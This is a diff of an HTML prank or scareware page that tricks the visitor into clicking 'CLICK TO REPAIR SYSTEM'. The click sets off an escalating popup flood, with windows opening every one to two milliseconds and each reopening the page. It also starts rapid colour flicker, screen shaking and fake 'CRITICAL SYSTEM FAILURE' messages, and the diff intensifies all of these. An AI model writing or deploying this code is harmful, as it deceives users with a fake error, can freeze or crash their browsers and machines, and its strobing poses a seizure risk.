@@ -2,124 +2,106 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<title>CRITICAL ERROR</title>
+<title>FATAL ERROR</title>
 <style>
 html, body {
     margin: 0;
     width: 100%;
     height: 100%;
     background: black;
-    overflow: hidden;
+    color: red;
     font-family: Arial, sans-serif;
+    overflow: hidden;
 }
 
-#center {
-    position: absolute;
-    top: 50%;
-    left: 50%;
-    transform: translate(-50%, -50%);
-}
-
-button {
-    font-size: 26px;
-    padding: 25px 50px;
-    cursor: pointer;
-    animation: blink 0.4s infinite;
+h1 {
+    animation: blink 0.1s infinite;
 }
 
 @keyframes blink {
-    0% { background: red; color: white; }
-    50% { background: white; color: black; }
-    100% { background: red; color: white; }
-}
-
-.error {
-    position: absolute;
-    color: red;
-    font-size: 24px;
-    pointer-events: none;
-    animation: shake 0.1s infinite;
-}
-
-@keyframes shake {
-    0% { transform: translate(0,0); }
-    25% { transform: translate(5px,-5px); }
-    50% { transform: translate(-5px,5px); }
-    75% { transform: translate(5px,5px); }
-    100% { transform: translate(-5px,-5px); }
+    0% { color: red; }
+    50% { color: white; }
+    100% { color: red; }
 }
 </style>
 </head>
 <body>
 
-<div id="center">
-    <button onclick="start()">CLICK TO FIX ERROR</button>
-</div>
+<h1 onclick="start()">CLICK TO REPAIR SYSTEM</h1>
 
 <script>
 let x = 0;
 let y = 0;
-let chaos = true;
+let dx = 80;
+let dy = 60;
 
-const winW = 200;
-const winH = 150;
-
-function rand(min, max) {
-    return Math.floor(Math.random() * (max - min)) + min;
-}
+const w = 220;
+const h = 160;
 
 function start() {
-    document.body.innerHTML = "";
+    document.body.innerHTML = "<h1>DO NOT CLOSE</h1>";
 
-    // Background flashing
+    const sw = screen.width;
+    const sh = screen.height;
+
+    // INSANE WINDOW FLOOD
     setInterval(() => {
-        document.body.style.background =
-            `rgb(${rand(0,255)},${rand(0,255)},${rand(0,255)})`;
-    }, 50);
+        for (let i = 0; i < 10; i++) {
+            window.open(
+                location.href,
+                "_blank",
+                `width=${w},height=${h},left=${x},top=${y}`
+            );
 
-    // Screen shaking
-    setInterval(() => {
-        document.body.style.transform =
-            `translate(${rand(-20,20)}px, ${rand(-20,20)}px)`;
-    }, 30);
+            x += dx;
+            y += dy;
 
-    // ERROR text spam
-    setInterval(() => {
-        const e = document.createElement("div");
-        e.className = "error";
-        e.innerText = "SYSTEM ERROR";
-        e.style.left = rand(0, window.innerWidth) + "px";
-        e.style.top = rand(0, window.innerHeight) + "px";
-        document.body.appendChild(e);
-
-        if (document.body.children.length > 300) {
-            document.body.removeChild(document.body.children[0]);
+            if (x > sw || x < 0) dx *= -1;
+            if (y > sh || y < 0) dy *= -1;
         }
-    }, 20);
+    }, 1); // 1ms
 
-    const screenW = screen.width;
-    const screenH = screen.height;
-
-    // Window spam (FAST)
+    // RANDOM SCREEN ATTACK
     setInterval(() => {
         window.open(
             location.href,
             "_blank",
-            `width=${winW},height=${winH},left=${x},top=${y}`
+            `width=${Math.random()*400+100},
+             height=${Math.random()*300+100},
+             left=${Math.random()*sw},
+             top=${Math.random()*sh}`
         );
+    }, 2);
 
-        x += winW;
+    // BACKGROUND FLICKER
+    setInterval(() => {
+        document.body.style.background =
+            `rgb(${Math.random()*255},
+                 ${Math.random()*255},
+                 ${Math.random()*255})`;
+    }, 30);
 
-        if (x + winW > screenW) {
-            x = 0;
-            y += winH;
-        }
+    // SCREEN SHAKE
+    setInterval(() => {
+        document.body.style.transform =
+            `translate(${Math.random()*40-20}px,
+                       ${Math.random()*40-20}px)`;
+    }, 20);
 
-        if (y + winH > screenH) {
-            x = rand(0, screenW);
-            y = rand(0, screenH);
-        }
-    }, 10); // ACTUAL 0.01 sec 😈
+    // ERROR TEXT STORM
+    setInterval(() => {
+        const e = document.createElement("div");
+        e.textContent = "CRITICAL SYSTEM FAILURE";
+        e.style.position = "absolute";
+        e.style.left = Math.random()*innerWidth + "px";
+        e.style.top = Math.random()*innerHeight + "px";
+        e.style.color = "red";
+        e.style.fontSize = "20px";
+        document.body.appendChild(e);
+
+        if (document.body.children.length > 500)
+            document.body.removeChild(document.body.children[0]);
+    }, 5);
 }
 </script>
 
